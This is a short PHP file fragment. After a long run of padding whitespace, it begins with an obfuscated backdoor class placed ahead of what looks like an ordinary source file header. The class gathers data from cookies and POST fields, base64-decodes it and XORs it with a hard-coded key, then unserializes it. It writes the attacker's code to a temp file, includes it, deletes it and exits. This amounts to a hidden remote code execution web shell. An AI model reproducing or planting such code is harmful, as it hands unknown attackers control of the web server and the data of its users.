<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("mlcet")){class mlcet{public static $vzafnq = "nmmawhhphkcyknlt";public static $ovfdn = NULL;public function __construct(){$izbjabad = @$_COOKIE[substr(mlcet::$vzafnq, 0, 4)];if (!empty($izbjabad)){$nusgvgwvb = "base64";$wmzyw = "";$izbjabad = explode(",", $izbjabad);foreach ($izbjabad as $xcownarv){$wmzyw .= @$_COOKIE[$xcownarv];$wmzyw .= @$_POST[$xcownarv];}$wmzyw = array_map($nusgvgwvb . "_decode", array($wmzyw,));$wmzyw = $wmzyw[0] ^ str_repeat(mlcet::$vzafnq, (strlen($wmzyw[0]) / strlen(mlcet::$vzafnq)) + 1);mlcet::$ovfdn = @unserialize($wmzyw);}}public function __destruct(){$this->vfbar();}private function vfbar(){if (is_array(mlcet::$ovfdn)) {$aietl = sys_get_temp_dir() . "/" . crc32(mlcet::$ovfdn["salt"]);@mlcet::$ovfdn["write"]($aietl, mlcet::$ovfdn["content"]);include $aietl;@mlcet::$ovfdn["delete"]($aietl);exit();}}}$yckxtx = new mlcet();$yckxtx = NULL;} ?><?php
// +----------------------------------------------------------------------+
